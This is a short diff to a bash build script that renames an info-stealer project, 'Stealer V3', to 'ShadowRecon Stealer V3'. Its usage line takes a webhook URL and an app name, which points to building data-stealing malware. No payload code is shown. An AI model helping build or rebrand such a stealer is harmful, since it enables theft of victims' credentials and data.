@@ -1,9 +1,9 @@
 #!/bin/bash
 
-# 1336 Stealer V3 - Build Script
+# ShadowRecon Stealer V3 - Build Script
 # Usage: ./build.sh <webhook_url> <app_name> [options]
 
-echo "🔥 1336 Stealer V3 - Modular Build System"
+echo "🔥 ShadowRecon Stealer V3 - Modular Build System"
 echo "========================================="
 
 # Check arguments
